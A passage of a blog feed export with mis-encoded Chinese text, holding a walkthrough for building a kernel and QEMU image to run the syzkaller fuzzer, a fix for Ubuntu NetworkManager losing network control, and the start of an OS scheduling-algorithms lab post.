class="hljs-attr">CONFIG_KCOV</span>=y<br><br><span class="hljs-comment"># Debug info for symbolization.</span><br><span class="hljs-attr">CONFIG_DEBUG_INFO</span>=y<br><br><span class="hljs-comment"># Memory bug detector</span><br><span class="hljs-attr">CONFIG_KASAN</span>=y<br><span class="hljs-attr">CONFIG_KASAN_INLINE</span>=y<br><br><span class="hljs-comment"># Required for Debian Stretch</span><br><span class="hljs-attr">CONFIG_CONFIGFS_FS</span>=y<br><span class="hljs-attr">CONFIG_SECURITYFS</span>=y<br></code></pre></div></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆé…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">make olddefconfig<br></code></pre></div></td></tr></table></figure></li><li><p>æ„å»ºå†…æ ¸</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">make -j`nproc`<br></code></pre></div></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å¯ä»¥å†…æ ¸æ–‡ä»¶å¤¹ä¸‹çœ‹åˆ°vmlinux(å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶)å’ŒbzImage(å†…æ ¸é•œåƒ)</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">ls $KERNEL/vmlinux<br># sample output - $KERNEL/vmlinux<br>ls $KERNEL/arch/x86/boot/bzImage<br># sample output - $KERNEL/arch/x86/boot/bzImage<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="æ„å»ºimage"><a class="markdownIt-Anchor" href="#æ„å»ºimage"></a> æ„å»ºimage</h3><ul><li><p>å®‰è£…debotstrap</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt install debootstrap<br></code></pre></div></td></tr></table></figure></li><li><p>ç”ŸæˆDebian Stretch Linuxé•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">mkdir $IMAGE<br>cd $IMAGE/<br>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh<br>chmod +x create-image.sh<br>./create-image.sh<br></code></pre></div></td></tr></table></figure></li><li><p>å®‰è£…é•œåƒçš„é¢å¤–å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">./create-image.sh --feature full<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="æ„å»ºqemu"><a class="markdownIt-Anchor" href="#æ„å»ºqemu"></a> æ„å»ºqemu</h3><ul><li><p>é¦–å…ˆå®‰è£…qemu</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo apt install qemu-system-x86<br></code></pre></div></td></tr></table></figure></li><li><p>å¯åŠ¨qemuè™šæ‹Ÿæœº</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">qemu-system-x86_64 \                            <br>        -m 2G \<br>        -smp 2 \<br>        -kernel /home/zino/syz/linux-5.14/arch/x86/boot/bzImage \<br>        -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \ <br>        -drive file=/home/zino/syz/image/stretch.img,format=raw \<br>        -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>        -net nic,model=e1000 \<br>        -enable-kvm \<br>        -nographic \<br>        -pidfile vm.pid \<br>        2&gt;&amp;1 | tee vm.log<br><br></code></pre></div></td></tr></table></figure><p>è¾“å…¥rootåæˆåŠŸè¿›å…¥</p><p><img src="/posts/60fc7e01/image-20211127143311829.png" alt="image-20211127143311829"></p></li><li><p>æµ‹è¯•ssh</p><p>å› ä¸ºåé¢syzkallerä¼šç”¨åˆ°sshè¿æ¥ï¼Œæ‰€ä»¥éœ€è¦æµ‹è¯•ä¸€ä¸‹</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">ssh -i /home/zino/syz/image/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></div></td></tr></table></figure><p>æˆåŠŸåœ¨å¦ä¸€ä¸ªç»ˆç«¯åˆ›å»ºè¿æ¥</p><p><img src="/posts/60fc7e01/image-20211127143344050.png" alt="image-20211127143344050"></p><p>ä¹‹åç”¨poweroffå…³é—­è™šæ‹Ÿæœº</p><p>å¼€å§‹å®‰è£…syzkaller</p><h3 id="å®‰è£…syzkaller"><a class="markdownIt-Anchor" href="#å®‰è£…syzkaller"></a> å®‰è£…syzkaller</h3><ul><li><p>goç¯å¢ƒé…ç½®</p><p><code>syzkaller</code>æ˜¯ç”¨goè¯­è¨€å†™çš„ï¼Œæ‰€ä»¥éœ€è¦é¦–å…ˆé…ç½®goç¯å¢ƒï¼Œå®‰è£…goçš„å®‰è£…åŒ…æ¥é…ç½®</p>  <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz<br>tar -xf go1.14.2.linux-amd64.tar.gz<br>mv go goroot<br>mkdir gopath<br>export GOPATH=`pwd`/gopath<br>export GOROOT=`pwd`/goroot<br>export PATH=$GOPATH/bin:$PATH<br>export PATH=$GOROOT/bin:$PATH<br></code></pre></div></td></tr></table></figure></li><li><p>ä¸‹è½½<code>syzkaller</code></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">go get -u -d github.com/google/syzkaller/prog #æœ‰ç‚¹æ…¢ï¼Œç›´æ¥git clone<br>#ä¸‹é¢çš„è·¯å¾„å¯ä»¥è‡ªå·±å»ºç«‹ï¼Œä¹Ÿå¯ä»¥ä¸å»ºï¼Œè¿™æ ·å°±è‡ªå·±æŒ‡å®šè·¯å¾„ï¼Œè®°å¾—åé¢ç”¨è¿™ä¸ªè·¯å¾„å°±è¡Œ<br>git clone https://github.com/google/syzkaller.git<br>cd gopath/src/github.com/google/syzkaller/<br>make<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>makeåå‡ºç°é”™è¯¯</strong></p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127225142.jpg" alt="makeé”™è¯¯"></p><p>æœç´¢äº†ä¹‹åå‘ç°è¿™æ˜¯ç”±äºmakeæ˜¯å†…å­˜ä¸å¤Ÿå¯¼è‡´çš„ï¼Œæ‰€ä»¥å­¦ä¹ äº†ä¸€ä¸‹å¦‚ä½•åˆ›å»ºäº¤æ¢åˆ†åŒºæ¥ç¼“è§£å†…å­˜å‹åŠ›</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">&gt;#åˆ›å»ºç”¨äºäº¤æ¢åˆ†åŒºçš„æ–‡ä»¶<br>&gt;dd if=/dev/zero of=/swapfile bs=1M count=2048<br>&gt;#è®¾ç½®äº¤æ¢åˆ†åŒºæ–‡ä»¶<br>&gt;mkswap /swapfile<br>&gt;#ç«‹å³å¯ç”¨äº¤æ¢åˆ†åŒºæ–‡ä»¶<br>&gt;swapon /swapfile<br>&gt;#æ‰“å¼€/etc/fstab<br>&gt;sudo vim /etc/fstab<br>&gt;#åœ¨ä¸‹é¢æ·»åŠ ä¸‹é¢ä¸€è¡Œï¼Œä½¿å…¶æ°¸ä¹…æœ‰æ•ˆ<br>&gt;/swapfile swap swap defaults 0 0<br></code></pre></div></td></tr></table></figure><p>ä¹‹åå†æ¬¡makeå°±æˆåŠŸäº†</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/zhangxiaoyang0/article/details/82501209">Linuxä¸Šåˆ›å»ºSWAPæ–‡ä»¶/åˆ†åŒº</a></p></blockquote><p>å¯ä»¥çœ‹åˆ°/syzkaller/binä¸‹å‡ºç°ä¸‹åˆ—æ–‡ä»¶</p><p><img src="/posts/60fc7e01/image-20211127230030934.png" alt="image-20211127230030934"></p></li><li><p>è¿è¡Œsyzkaller manager</p><p>é¦–å…ˆéœ€è¦è‡ªå·±å»ºç«‹ä¸€ä¸ªé…ç½®æ–‡ä»¶my.cfgï¼Œä½œä¸ºsyzkallerçš„é…ç½®æ–‡ä»¶</p><p>æˆ‘çš„é…ç½®è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br><span class="hljs-attr">&quot;http&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br><span class="hljs-attr">&quot;workdir&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller/workdir&quot;</span>,<br><span class="hljs-attr">&quot;kernel_obj&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14&quot;</span>,<br><span class="hljs-attr">&quot;image&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.img&quot;</span>,<br><span class="hljs-attr">&quot;sshkey&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.id_rsa&quot;</span>,<br><span class="hljs-attr">&quot;syzkaller&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller&quot;</span>,<br><span class="hljs-attr">&quot;procs&quot;</span>: <span class="hljs-number">8</span>,<br><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;qemu&quot;</span>,<br><span class="hljs-attr">&quot;vm&quot;</span>: &#123;<br><span class="hljs-attr">&quot;count&quot;</span>: <span class="hljs-number">4</span>,<br><span class="hljs-attr">&quot;kernel&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14/arch/x86/boot/bzImage&quot;</span>,<br><span class="hljs-attr">&quot;cpu&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-attr">&quot;mem&quot;</span>: <span class="hljs-number">2048</span>,<br>#<span class="hljs-attr">&quot;qemu_args&quot;</span>: <span class="hljs-string">&quot;-enable-kvm&quot;</span><br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>ç„¶åè¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªsyzkallerçš„å·¥ä½œåŒºï¼Œç”¨æ¥å­˜æ”¾crashä¿¡æ¯ç­‰</p><p>ç„¶åå°±å¯ä»¥ç›´æ¥å¼€å§‹è¿è¡Œsyzkalleräº†</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">mkdir workdir<br>./bin/syz-manager -config=my.cfg<br></code></pre></div></td></tr></table></figure><blockquote><p>butæœç„¶æœ€åä¸€æ­¥è¿˜æ˜¯æ²¡æœ‰é‚£ä¹ˆé¡ºåˆ©</p><p>æŠ¥é”™å¦‚ä¸‹</p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127230728.jpg" alt="QQå›¾ç‰‡20211127230728"></p><p>åŠªåŠ›äº†å¾ˆä¹…ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªè§£å†³æ–¹æ³•ï¼ˆåŸå› æœ‰å¾…æ€è€ƒï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo vim /etc/default/grub<br>#å°†æœ€åä¸€è¡Œä¿®æ”¹æˆ<br>GRUB_CMDLINE_LINUX=&quot;console=ttyS0 console=ttyS0,115200n81 no_timer_check  crashkernel=auto rhgb quiet kvm.ignore_msrs=1&quot;<br>#æ›´æ–°é…ç½®<br>grub-mkconfig -o &quot;$(readlink -e /etc/grub2.conf)&quot;<br>#ä½¿é…ç½®ç”Ÿæ•ˆ<br>echo 1 | sudo tee /sys/module/kvm/parameters/ignore_msrs<br></code></pre></div></td></tr></table></figure><p>è¿™æ—¶å€™å†å»æ‰§è¡Œ<code>./bin/syz-manager -config=my.cfg</code>å°±å¯ä»¥æˆåŠŸäº†</p><p>åšå®¢ä¸Šè¯´æ˜¯é‡å¯ç”Ÿæ•ˆï¼Œä½†æ˜¯ä¸é‡å¯æœ‰æ•ˆï¼Œé‡å¯åå°±åˆä¸è¡Œäº†ï¼Œæ‰€ä»¥æ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://cloudnull.io/2020/07/fixing-msrs-errors-in-nested-virt/">Fixing MSR 0xe1 to 0x0</a></p><p>åæ¥åœ¨å®˜æ–¹çš„troubleshootingé‡Œæ‰¾åˆ°äº†è§£å†³æ–¹æ³•</p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127214133-16380205507012.png" alt="é—®é¢˜è§£å†³æ–¹æ³•"></p><p>åœ¨å®˜æ–¹ç»™çš„é…ç½®æ–‡ä»¶çš„æœ€åä¸€è¡ŒåŠ ä¸Š</p><p><code>&quot;qemu_args&quot;: &quot;-enable-kvm&quot;</code></p><p>å³æŠŠä¸Šæ–¹çš„é…ç½®æ–‡ä»¶çš„æœ€åä¸€è¡Œæ³¨é‡Šå–æ¶ˆ</p></blockquote></li></ul><p>å†æ¬¡æ‰§è¡Œ<code>./bin/syz-manager -config=my.cfg</code></p><p>æˆåŠŸï¼</p><p><img src="/posts/60fc7e01/image-20211127185108620.png" alt="image-20211127185108620"></p><p>webç«¯ä¹ŸæˆåŠŸæ˜¾ç¤º</p><p><img src="/posts/60fc7e01/image-20211127185004493.png" alt="image-20211127185004493"></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>syzkaller</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºç½‘ç»œæ‰˜ç®¡æ¶ˆå¤±çš„é—®é¢˜</title>
    <link href="/posts/1326caf9/"/>
    <url>/posts/1326caf9/</url>
    
    <content type="html"><![CDATA[<p>å¦‚å›¾æ‰€ç¤ºï¼ŒUbuntu20.04é¢‘ç¹å‡ºç°ç½‘ç»œæœªæ‰˜ç®¡çš„ç°è±¡ï¼Œå³ä¸Šè§’ç½‘ç»œè¿æ¥å›¾æ ‡æ¶ˆå¤±</p><p><img src="/posts/1326caf9/image-20211127204523849.png" alt="image-20211127204523849"></p><p>è™šæ‹Ÿæœºçš„ç½‘ç»œé™¤äº†å¯ä»¥ä¿®æ”¹/etc/network/interfacesæ¥è¿›è¡Œé…ç½®ä»¥å¤–ï¼›è¿˜å¯ä»¥ç›´æ¥åœ¨network-managerä¸­é…ç½®ã€‚</p><ul><li><p>é€šè¿‡ interfacesä¿®æ”¹çš„æ–¹æ³•å‚ç…§Serverç‰ˆæœ¬ã€‚</p></li><li><p>network-managerçš„é…ç½®å¾ˆç›´è§‚ï¼ŒæŒ‰ç…§æç¤ºä¸€æ­¥ä¸€æ­¥æ“ä½œå³å¯ï¼Œæœ‰å…´è¶£çš„æœ‹å‹ï¼Œå¯ä»¥è‡ªè¡ŒGoogleæˆ–è€…Baiduã€‚</p></li></ul><p>ä½†å¦‚æœä¿®æ”¹äº†interfacesï¼Œåˆé…ç½®äº†network-managerï¼ˆä»¥ä¸‹ç®€ç§°nmï¼‰ï¼Œå°±å¯èƒ½ä¼šå‡ºç°äº†ä¸€äº›è«åå…¶å¦™çš„é—®é¢˜:</p><ol><li><p>interfaceså’Œ nmä¸­çš„ç½‘ç»œè®¾ç½®ä¸ä¸€æ ·ï¼Œç³»ç»Ÿå®é™…çš„IPæ˜¯å“ªä¸ªï¼Ÿ</p></li><li><p>æœ‰æ—¶å€™è«åå…¶å¦™çš„ï¼Œç•Œé¢å³ä¸Šè§’çš„ç½‘ç»œè¿æ¥å›¾æ ‡å°±ä¸¢å¤±äº†ã€‚</p></li><li><p>æ˜æ˜åœ¨nmä¸­é…ç½®äº†æ­£ç¡®çš„ç½‘ç»œè®¾ç½®ï¼Œä¸ºä»€ä¹ˆå°±ä¸Šä¸äº†ç½‘å‘¢ï¼Ÿ</p></li></ol><p>é¦–å…ˆï¼Œå½“ç³»ç»Ÿå†…æ²¡æœ‰ç¬¬ä¸‰æ–¹ç½‘ç»œç®¡ç†å·¥å…·ï¼ˆæ¯”å¦‚nmï¼‰æ—¶ï¼Œç³»ç»Ÿé»˜è®¤ä½¿ç”¨interfacesæ–‡ä»¶å†…çš„å‚æ•°è¿›è¡Œç½‘ç»œé…ç½®ã€‚ï¼ˆå°±åƒServerç‰ˆæœ¬ä¸€æ ·ï¼‰</p><p>æ¥ç€ï¼Œå½“ç³»ç»Ÿå†…å®‰è£…äº† nmä¹‹åï¼Œnmé»˜è®¤æ¥ç®¡äº†ç³»ç»Ÿçš„ç½‘ç»œé…ç½®ï¼Œä½¿ç”¨nm è‡ªå·±çš„ç½‘ç»œé…ç½®å‚æ•°æ¥è¿›è¡Œé…ç½®ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœç”¨æˆ·åœ¨å®‰è£…nmä¹‹åï¼Œè‡ªå·±æ‰‹åŠ¨ä¿®æ”¹äº†interfaces æ–‡ä»¶ï¼Œé‚£nmå°±è‡ªåŠ¨åœæ­¢å¯¹ç³»ç»Ÿç½‘ç»œçš„ç®¡ç†ï¼Œç³»ç»Ÿæ”¹ä½¿ç”¨interfaces æ–‡ä»¶å†…çš„å‚æ•°è¿›è¡Œç½‘ç»œé…ç½®ã€‚</p><p>æ­¤æ—¶ï¼Œå†å»ä¿®æ”¹nm å†…çš„å‚æ•°ï¼Œä¸å½±å“ç³»ç»Ÿå®é™…çš„ç½‘ç»œé…ç½®ã€‚è‹¥è¦è®©nm å†…çš„é…ç½®ç”Ÿæ•ˆï¼Œå¿…é¡»é‡æ–°å¯ç”¨nm æ¥ç®¡ç³»ç»Ÿçš„ç½‘ç»œé…ç½®ã€‚</p><p>ç°åœ¨çŸ¥é“äº†ä¸¤è€…ä¹‹é—´çš„å·¥ä½œå…³ç³»ï¼Œå†çœ‹ä¸Šé¢çš„ä¸‰ä¸ªé—®é¢˜ï¼š</p><ol><li><p>è¦çœ‹nmæ˜¯å¦æ¥ç®¡ï¼Œå¦‚æœæ²¡æœ‰æ¥ç®¡ï¼Œç³»ç»Ÿå®é™…çš„IPè®¾ç½®ä»¥interfaces ä¸­çš„ä¸ºå‡†ã€‚åä¹‹ï¼Œä»¥nm ä¸­çš„ä¸ºå‡†ã€‚</p></li><li><p>å½“nm åœæ­¢æ¥ç®¡çš„æ—¶å€™ï¼Œç½‘ç»œè¿æ¥å›¾æ ‡å°±ä¸¢å¤±äº†ã€‚</p></li><li><p>åŒæ ·æ˜¯æ¥ç®¡çš„é—®é¢˜ã€‚</p></li></ol><p>å¦‚æœç”¨æˆ·å¸Œæœ›ç›´æ¥ä½¿ç”¨interfaces è¿›è¡Œç½‘ç»œé…ç½®ï¼Œé‚£æœ€å¥½åˆ é™¤network-manager ã€‚</p><p>å¦‚æœåœ¨å‡ºç°ä¸Šè¿°é—®é¢˜ä¹‹åï¼Œå¸Œæœ›èƒ½ç»§ç»­ä½¿ç”¨nm æ¥è¿›è¡Œç½‘ç»œé…ç½®ï¼Œåˆ™éœ€è¦è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># åœæ­¢ nmæœåŠ¡<br>sudo service network-manager stop <br># æ‰“å¼€nm çš„é…ç½®æ–‡ä»¶(å…·ä½“é…ç½®æ–‡ä»¶åå­—è¿›å…¥ç›®å½•çœ‹ï¼Œå¯èƒ½ä¸å¤ªä¸€æ ·)<br>sudo vim /etc/NetworkManager/NetworkManager.conf <br></code></pre></div></td></tr></table></figure><p><strong>é‡Œé¢æœ‰ä¸€è¡Œï¼šmanaged=true</strong></p><p><strong>å¦‚æœä½ æ‰‹å·¥æ”¹è¿‡/etc/network/interfacesï¼Œnmä¼šè‡ªå·±æŠŠè¿™è¡Œæ”¹æˆï¼šmanaged=false</strong></p><p><strong>å°†false ä¿®æ”¹æˆtrue</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">#é‡å¯nmæœåŠ¡<br>sudo service network-manager start<br></code></pre></div></td></tr></table></figure><p>ç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># å¼€å¯NMæ‰˜ç®¡<br>nmcli n on<br></code></pre></div></td></tr></table></figure><p>æœ‰æ—¶å€™å¼€å…³æœºåç½‘ç»œè¿æ¥å›¾æ ‡ä»ä¼šæ¶ˆå¤±ï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶å·²ç»è®¾ç½®ä¸ºäº†true,è¿™æ—¶å€™å†æ‰§è¡Œä¸€éä¸‹é¢ä¸‰æ¡å‘½ä»¤åå¯ä»¥æˆåŠŸæ¢å¤ç½‘ç»œã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">sudo service network-manager <span class="hljs-built_in">stop</span><br>sudo service network-manager <span class="hljs-built_in">start</span><br>nmcli n <span class="hljs-keyword">on</span><br></code></pre></div></td></tr></table></figure><p><strong>å‚è€ƒé“¾æ¥</strong></p><p><a href="https://blog.csdn.net/vic_qxz/article/details/118863177?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-2&amp;spm=1001.2101.3001.4242.1"> NetworkManagerè®¾ç½®_networkmanageré…ç½®æ–‡ä»¶</a></p><p><a href="https://www.cnblogs.com/sankye/p/5020721.html?ivk_sa=1024320u">Ubuntuä¸­å¯ç”¨å…³é—­Network-managerç½‘ç»œè®¾ç½®é—®é¢˜</a></p>]]></content>
    
    
    <categories>
      
      <category>bug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linuxç½‘ç»œé—®é¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒå››-è°ƒåº¦ç®—æ³•</title>
    <link href="/posts/3f961b4f/"/>
    <url>/posts/3f961b4f/</url>
    
    <content type="html"><![CDATA[<h1 id="è°ƒåº¦ç®—æ³•"><a class="markdownIt-Anchor" href="#è°ƒåº¦ç®—æ³•"></a> è°ƒåº¦ç®—æ³•</h1><h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>å®ç°å…ˆæ¥å…ˆæœåŠ¡è°ƒåº¦ç®—æ³•ï¼ˆSPFï¼‰</li><li>å®ç°æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•ï¼ˆRRï¼‰</li></ul><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>é€šè¿‡å¯¹è¿›ç¨‹è°ƒåº¦ç®—æ³•çš„è®¾è®¡ï¼Œæ·±å…¥ç†è§£è¿›ç¨‹è°ƒåº¦çš„åŸç†ã€‚</li><li>è¿›ç¨‹æ˜¯ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šè¿è¡Œçš„è¿‡ç¨‹ï¼Œå®ƒæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ã€‚</li><li>è¿›ç¨‹è°ƒåº¦åˆ†é…å¤„ç†æœºï¼Œæ˜¯æ§åˆ¶åè°ƒè¿›ç¨‹å¯¹CPUçš„ç«äº‰ï¼Œå³æŒ‰ä¸€å®šçš„è°ƒåº¦ç®—æ³•ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰<br>ä¸­ä¸€ä¸ªè¿›ç¨‹ï¼ŒæŠŠCPUçš„ä½¿ç”¨æƒäº¤ç»™è¢«é€‰ä¸­çš„è¿›ç¨‹ã€‚</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><ol><li>å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFCFSï¼‰è°ƒåº¦ç®—æ³•</li></ol><ul><li>åŸç†ï¼šæ¯æ¬¡è°ƒåº¦æ˜¯ä»å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œé€‰æ‹©ä¸€ä¸ªæœ€å…ˆè¿›å…¥å°±ç»ªé˜Ÿåˆ—çš„è¿›ç¨‹ï¼ŒæŠŠå¤„ç†å™¨åˆ†é…ç»™è¯¥è¿›ç¨‹ï¼Œä½¿ä¹‹å¾—åˆ°æ‰§è¡Œã€‚è¯¥è¿›ç¨‹ä¸€æ—¦å æœ‰äº†å¤„ç†å™¨ï¼Œå®ƒå°±ä¸€ç›´è¿è¡Œä¸‹å»ï¼Œç›´åˆ°è¯¥è¿›ç¨‹å®Œæˆæˆ–å› 